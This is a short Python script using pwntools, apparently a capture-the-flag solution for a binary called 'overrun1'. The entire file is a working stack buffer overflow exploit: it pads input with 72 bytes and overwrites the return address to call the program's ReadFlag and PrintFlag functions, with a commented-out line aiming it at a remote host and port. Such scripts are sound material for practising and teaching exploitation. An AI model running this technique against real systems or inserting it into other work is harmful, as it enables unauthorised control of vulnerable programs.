from pwn import *

filename = "./overrun1"
elf = ELF(filename)
io = process(filename)
#io = remote("160.251.17.135", "10007")

payload = b"A"*72
payload += p64(elf.symbols['ReadFlag'])
payload += p64(elf.symbols['PrintFlag'])

io.sendline(payload)
io.interactive()
